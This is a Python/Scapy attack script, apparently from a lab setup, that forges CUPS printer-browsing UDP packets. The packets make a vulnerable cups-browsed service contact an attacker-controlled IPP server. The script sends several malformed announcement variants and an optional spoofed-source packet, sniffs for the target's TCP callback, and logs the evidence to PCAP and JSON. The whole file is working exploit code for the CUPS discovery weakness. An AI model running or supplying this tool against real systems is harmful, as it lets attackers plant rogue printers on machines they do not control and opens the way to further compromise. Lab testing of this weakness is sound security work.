#!/usr/bin/env python3

import argparse
import logging
import sys
import time
import threading
import json
from datetime import datetime
from pathlib import Path

from scapy.all import (
    IP, UDP, TCP, Raw,
    send, sniff, wrpcap,
    RandShort, conf
)


LOG_FORMAT = "%(asctime)s [%(levelname)s] %(message)s"
logging.basicConfig(format=LOG_FORMAT, datefmt="%H:%M:%S", level=logging.INFO)
log = logging.getLogger("cups_attack")


def build_browsing_payload(
    printer_type: int,
    printer_state: int,
    printer_uri: str,
    printer_location: str,
    printer_info: str,
) -> bytes:

    payload_str = '%x %x %s "%s" "%s"' % (
        printer_type,
        printer_state,
        printer_uri,
        printer_location,
        printer_info,
    )
    return payload_str.encode("utf-8")


def build_packet(
    cups_ip: str,
    cups_port: int,
    src_ip: str,
    src_port: int,
    payload: bytes,
) -> "IP":

    pkt = (
        IP(src=src_ip, dst=cups_ip)
        / UDP(sport=src_port, dport=cups_port)
        / Raw(load=payload)
    )
    return pkt


def get_variation(variation_id: int, printer_host: str, printer_port: int,
                  custom: dict = None) -> dict:
   
    base = {
        "printer_type":     0x00,
        "printer_state":    0x03,          # idle
        "printer_uri":      f"ipp://{printer_host}:{printer_port}/printers/NAME",
        "printer_location": "Kali Lab",
        "printer_info":     "AttackerPrinter_v1",
        "src_ip":           printer_host,
        "src_port":         int(RandShort()),
        "description":      "Standard CUPS browsing announcement",
    }

    # Allow full CLI override for custom experiments
    if custom:
        base.update(custom)

    variations = {
        1: base,
        2: {**base,
            "printer_type":  0x000018,     # colour + postscript + duplex
            "printer_info":  "AttackerPrinter-ColourPS",
            "description":   "Unusual printer-type flags (colour/PS/duplex)"},
        3: {**base,
            "printer_state": 0x05,          # stopped
            "printer_info":  "AttackerPrinter-Stopped",
            "description":   "Printer state=stopped (abnormal)"},
        4: {**base,
            "printer_uri":   f"http://{printer_host}:{printer_port}/printers/NAME",
            "printer_info":  "AttackerPrinter-BadScheme",
            "description":   "Malformed URI scheme (http:// instead of ipp://)"},
        5: {**base,
            "printer_uri":   f"ipp://{printer_host}:9999/printers/NAME",
            "printer_info":  "AttackerPrinter-WrongPort",
            "description":   "Printer advertised on port 9999 (not the real IPP port)"},
    }
    return variations.get(variation_id, base)


class ResponseMonitor:

    def __init__(self, cups_ip: str, printer_host: str,
                 printer_port: int, timeout: int = 10, iface: str = None):
        self.cups_ip      = cups_ip
        self.printer_host = printer_host
        self.printer_port = printer_port
        self.timeout      = timeout
        self.iface        = iface
        self.captured     = []

    def _is_cups_callback(self, pkt) -> bool:

        if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
            return False
        return (
            pkt[IP].src == self.cups_ip
            and pkt[IP].dst == self.printer_host
            and pkt[TCP].dport == self.printer_port
            and (pkt[TCP].flags & 0x02)  # SYN bit
        )

    def _packet_callback(self, pkt):
        if self._is_cups_callback(pkt):
            log.info(
                "[RESPONSE] CUPS container (%s) opened TCP connection "
                "to our printer on port %d — insecure discovery confirmed!",
                self.cups_ip, self.printer_port
            )
            self.captured.append(pkt)

    def start(self):
        bpf = (
            f"tcp and src host {self.cups_ip} "
            f"and dst host {self.printer_host} "
            f"and dst port {self.printer_port}"
        )
        log.info(
            "Monitoring for TCP callback from %s to %s:%d (iface=%s, timeout %ds) ...",
            self.cups_ip, self.printer_host, self.printer_port,
            self.iface or "auto", self.timeout
        )
        kwargs = {
            "filter":  bpf,
            "prn":     self._packet_callback,
            "timeout": self.timeout,
            "store":   False,
        }
        if self.iface:
            kwargs["iface"] = self.iface

        self._thread = threading.Thread(
            target=sniff, kwargs=kwargs, daemon=True
        )
        self._thread.start()

    def wait(self):
        self._thread.join()
        return self.captured


class FullCapture:


    def __init__(self, cups_ip: str, printer_host: str,
                 printer_port: int, timeout: int = 15, iface: str = None):
        self.cups_ip      = cups_ip
        self.printer_host = printer_host
        self.printer_port = printer_port
        self.timeout      = timeout
        self.iface        = iface
        self.captured     = []

    def _callback(self, pkt):
        self.captured.append(pkt)

    def start(self):
        bpf = (
            f"(host {self.cups_ip} or host {self.printer_host}) "
            f"and (port 631 or port {self.printer_port})"
        )
        log.debug("Full capture BPF: %s  iface=%s", bpf, self.iface or "auto")
        kwargs = {
            "filter":  bpf,
            "prn":     self._callback,
            "timeout": self.timeout,
            "store":   True,
        }
        if self.iface:
            kwargs["iface"] = self.iface

        self._thread = threading.Thread(
            target=sniff, kwargs=kwargs, daemon=True
        )
        self._thread.start()

    def wait(self):
        self._thread.join()
        return self.captured


def run_spoofed_experiment(args, evidence: list):

    log.info("--- Spoofed-source experiment ---")
    spoofed_ip = args.spoof_src
    payload = build_browsing_payload(
        printer_type     = 0x00,
        printer_state    = 0x03,
        printer_uri      = f"ipp://{args.printer_host}:{args.printer_port}/printers/NAME",
        printer_location = "Kali Lab",
        printer_info     = "AttackerPrinter-SpoofedSrc",
    )
    pkt = build_packet(
        cups_ip   = args.target,
        cups_port = args.cups_port,
        src_ip    = spoofed_ip,
        src_port  = int(RandShort()),
        payload   = payload,
    )
    log.info("  Spoofed src: %s → %s:%d", spoofed_ip, args.target, args.cups_port)
    if args.verbose:
        pkt.show()
    send(pkt, verbose=False)
    evidence.append({
        "timestamp":   datetime.now().isoformat(),
        "variation":   "spoofed_src",
        "description": f"Source IP spoofed to {spoofed_ip}",
        "src_ip":      spoofed_ip,
        "dst_ip":      args.target,
        "dst_port":    args.cups_port,
        "payload":     payload.decode(),
    })
    log.info("  Spoofed packet sent.")
    return pkt


def run_attack(args):
    sent_packets = []
    evidence     = []

    if args.variation == 0:
        variation_ids = [1, 2, 3, 4, 5]
        log.info("Running variations 1–5.")
    else:
        variation_ids = [args.variation]
        log.info("Running variation %d only.", args.variation)

    custom = {}
    if args.printer_type  is not None: custom["printer_type"]     = args.printer_type
    if args.printer_state is not None: custom["printer_state"]    = args.printer_state
    if args.printer_location:          custom["printer_location"] = args.printer_location
    if args.printer_info:              custom["printer_info"]     = args.printer_info

    cap_timeout = args.monitor_timeout + len(variation_ids) * args.interval + 5

    full_cap = FullCapture(
        cups_ip      = args.target,
        printer_host = args.printer_host,
        printer_port = args.printer_port,
        timeout      = cap_timeout,
        iface        = args.iface,
    )
    full_cap.start()

    monitor = ResponseMonitor(
        cups_ip      = args.target,
        printer_host = args.printer_host,
        printer_port = args.printer_port,
        timeout      = cap_timeout,
        iface        = args.iface,
    )
    monitor.start()

    for vid in variation_ids:
        params = get_variation(vid, args.printer_host, args.printer_port,
                               custom if vid == 1 else None)

        payload = build_browsing_payload(
            printer_type     = params["printer_type"],
            printer_state    = params["printer_state"],
            printer_uri      = params["printer_uri"],
            printer_location = params["printer_location"],
            printer_info     = params["printer_info"],
        )

        pkt = build_packet(
            cups_ip   = args.target,
            cups_port = args.cups_port,
            src_ip    = params["src_ip"],
            src_port  = params["src_port"],
            payload   = payload,
        )

        log.info("--- Variation %d: %s ---", vid, params["description"])
        log.info("  Payload : %s", payload.decode())
        log.info("  Packet  : %s → %s:%d (sport=%d)",
                 params["src_ip"], args.target, args.cups_port, params["src_port"])

        if args.verbose:
            pkt.show()

        send(pkt, verbose=False)
        sent_packets.append(pkt)

        evidence.append({
            "timestamp":   datetime.now().isoformat(),
            "variation":   vid,
            "description": params["description"],
            "src_ip":      params["src_ip"],
            "src_port":    params["src_port"],
            "dst_ip":      args.target,
            "dst_port":    args.cups_port,
            "payload":     payload.decode(),
        })

        log.info("  Packet sent.")

        if args.interval > 0 and vid != variation_ids[-1]:
            time.sleep(args.interval)

    if args.spoof_src:
        time.sleep(args.interval)
        spoof_pkt = run_spoofed_experiment(args, evidence)
        sent_packets.append(spoof_pkt)

    log.info("Waiting for victim responses ...")
    responses   = monitor.wait()
    all_traffic = full_cap.wait()

    if responses:
        log.info(
            "[+] %d TCP SYN(s) from CUPS container detected — "
            "insecure discovery mechanism confirmed.",
            len(responses)
        )
        for r in responses:
            evidence.append({
                "timestamp": datetime.now().isoformat(),
                "event":     "cups_tcp_callback",
                "summary":   r.summary(),
            })
    else:
        log.warning(
            "[-] No TCP callback from CUPS detected within timeout.\n"
            "    Checklist:\n"
            "      1. Is ipp_server.py running on %s:%d ?\n"
            "      2. Is cups-browsed active inside the container?\n"
            "         docker exec <container> systemctl status cups-browsed\n"
            "      3. Is UDP 631 reachable?\n"
            "         nmap -sU -p 631 %s\n"
            "      4. Correct interface? Run: ip link show",
            args.printer_host, args.printer_port, args.target
        )

    # Save PCAP
    if args.output:
        Path(args.output).parent.mkdir(parents=True, exist_ok=True)
        packets_to_save = all_traffic if all_traffic else (sent_packets + responses)
        if packets_to_save:
            wrpcap(args.output, packets_to_save)
            log.info("PCAP saved → %s (%d packets)", args.output,
                     len(packets_to_save))
        else:
            log.warning("No packets captured — PCAP not written.")

    # Save evidence log
    if args.log_file:
        Path(args.log_file).parent.mkdir(parents=True, exist_ok=True)
        with open(args.log_file, "w") as f:
            json.dump(evidence, f, indent=2)
        log.info("Evidence log saved → %s", args.log_file)

    return evidence


def parse_args():
    parser = argparse.ArgumentParser(
        prog="cups_attack.py",
        description=(
            "CUPS insecure printer-discovery demonstration tool.\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    target = parser.add_argument_group("Target")
    target.add_argument(
        "--target", required=True,
        help="IP of the vulnerable CUPS container (e.g. 172.18.0.2)"
    )
    target.add_argument(
        "--cups-port", type=int, default=631,
        help="UDP port cups-browsed listens on (default: 631)"
    )

    printer = parser.add_argument_group("Attacker printer")
    printer.add_argument(
        "--printer-host", required=True,
        help="IP where your IPP server is running (e.g. 172.18.0.1)"
    )
    printer.add_argument(
        "--printer-port", type=int, default=8631,
        help="Port your IPP server listens on (default: 8631)"
    )

    var = parser.add_argument_group("Variation")
    var.add_argument(
        "--variation", type=int, default=0,
        choices=[0, 1, 2, 3, 4, 5],
        help=(
            "Which packet variation to send:\n"
            "  0 = all 1–5 (default)\n"
            "  1 = standard baseline (ipp://)\n"
            "  2 = unusual printer-type flags\n"
            "  3 = printer state=stopped\n"
            "  4 = malformed URI scheme (http://)\n"
            "  5 = printer advertised on wrong port (9999)"
        )
    )
    var.add_argument(
        "--spoof-src", metavar="IP", default=None,
        help="Run an additional spoofed-source experiment using this IP."
    )

    custom = parser.add_argument_group(
        "Field overrides (applied to variation 1 / custom experiments)"
    )
    custom.add_argument("--printer-type",     type=lambda x: int(x, 0), default=None,
                        help="printer-type hex value (e.g. 0x00)")
    custom.add_argument("--printer-state",    type=lambda x: int(x, 0), default=None,
                        help="printer-state hex value (e.g. 0x03)")
    custom.add_argument("--printer-location", default=None,
                        help="printer-location string")
    custom.add_argument("--printer-info",     default=None,
                        help="printer-info string")

    out = parser.add_argument_group("Output")
    out.add_argument(
        "--output", default="pcap_files/attack_traffic.pcap",
        help="PCAP output file (default: pcap_files/attack_traffic.pcap)"
    )
    out.add_argument(
        "--log-file", default="evidence/attack_log.json",
        help="JSON evidence log (default: evidence/attack_log.json)"
    )

    beh = parser.add_argument_group("Behaviour")
    beh.add_argument(
        "--iface", default=None,
        help=(
            "Network interface for sniffing (e.g. eth0, br-xxxx).\n"
            "If omitted, Scapy picks automatically.\n"
            "Find yours with: ip link show"
        )
    )
    beh.add_argument(
        "--monitor-timeout", type=int, default=10,
        help="Base seconds to wait for victim response (default: 10)"
    )
    beh.add_argument(
        "--interval", type=float, default=1.0,
        help="Seconds between variations (default: 1.0)"
    )
    beh.add_argument("--verbose", action="store_true",
                     help="Show Scapy pkt.show() for each packet")
    beh.add_argument("--debug",   action="store_true",
                     help="Set log level to DEBUG")

    return parser.parse_args()


def main():
    args = parse_args()

    if args.debug:
        log.setLevel(logging.DEBUG)

    conf.verb = 0

    log.info("=" * 60)
    log.info("CUPS Insecure Printer Discovery — Attack Tool")
    log.info("Target CUPS:      %s:%d (UDP)", args.target, args.cups_port)
    log.info("Attacker printer: %s:%d", args.printer_host, args.printer_port)
    log.info("Interface:        %s", args.iface or "auto")
    log.info("=" * 60)

    try:
        run_attack(args)
    except PermissionError:
        log.error("Permission denied — run with sudo (Scapy needs raw sockets).")
        sys.exit(1)
    except KeyboardInterrupt:
        log.info("Interrupted by user.")
        sys.exit(0)


if __name__ == "__main__":
    main()
